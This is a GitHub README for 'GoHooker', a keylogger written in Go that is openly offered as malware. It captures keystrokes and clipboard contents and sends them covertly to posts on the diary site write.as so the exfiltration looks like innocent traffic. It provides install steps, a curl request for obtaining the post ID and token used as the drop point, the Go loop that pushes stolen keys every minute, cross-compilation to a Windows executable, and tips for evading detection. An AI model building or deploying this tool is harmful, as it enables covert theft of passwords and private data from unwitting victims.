  <h1>GoHooker</h1>
</div>
C2-Less keylogger that sends the *clipboard* & *keystrokes* to **write.as**, a "journal" or "diary" website used to post your thoughts or feelings. Upon initial upload, **write.as** provides a unique ID, and token to update your existing post. From there we exfiltrate clipboard data & keystroke data to such post. This allows inconspicuous data exfiltration rather than pushing to a C2 or some pastebin alternative.

## Prerequisite üöÄ
| Prerequisite | Version |
|--------------|---------|
| Go           |  <=1.22 |


## Install üî®
```bash
git clone https://github.com/CharlesTheGreat77/goHooker
cd goHooker
go mod init main
go mod tidy
```

## Usage ‚öôÔ∏è
Firstly, we must get *ID* and *token* to a given post from **write.as**. This is where the keystrokes and clipboard content will exfiltrate to. 

Obtain ID and token for a post:
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: write.as' -H $'Content-Length: 114' -H $'Sec-Ch-Ua-Platform: \"macOS\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Sec-Ch-Ua: \"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"' -H $'Content-Type: application/json' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' -H $'Accept: */*' -H $'Origin: https://write.as' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://write.as/new' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=1, i' -H $'Connection: keep-alive' \
    --data-binary $'{\"body\":\"this is a test\",\"title\":\"\",\"font\":\"norm\",\"web\":true,\"top\":5633,\"lang\":\"en\",\"crosspost\":[],\"public\":false}' \
    $'https://write.as/api/posts'
```
* This returns some *json* output, **copy** the id and token for *your* post.

Second, **paste** the *id* and *token* values inside the **main.go** file.
```go
const ( // this gets cooked within an hour of inactivity
	urlID = ""
	token = ""
)
```

Compile for a given OS
```bash
go build -o helloWorld main.go
```
Cross compile:
```bash
GOOS=windows GOARCH=amd64 go build -o hooker.exe
```

## Exfiltration üìÆ
goHooker sends data every **minute**, one can change the timer as needed inside the *main.go* file:
```go
// func to push data back to the server & timer for such
func pusher() {
	for {
		time.Sleep(60 * time.Second) // default timer

		mu.Lock()
		if len(keyBuffer) > 0 {
            // sends data to write.as
			_ = updatePimp(keyBuffer)
			keyBuffer = "" // Reset buffer
		}
		mu.Unlock()
	}
}
```

### Tested Environments üñ•Ô∏è
* MacOS - Sanoma 14.5
* Windows 10

## Special Considerations ‚≠ê
One can delete the functionality to set the executable on startup and admin checks to reduce the chances of detection etc.

## Contributions ‚ù§Ô∏è
Although this is straight forward, any contributions to additional functionality is welcomed!
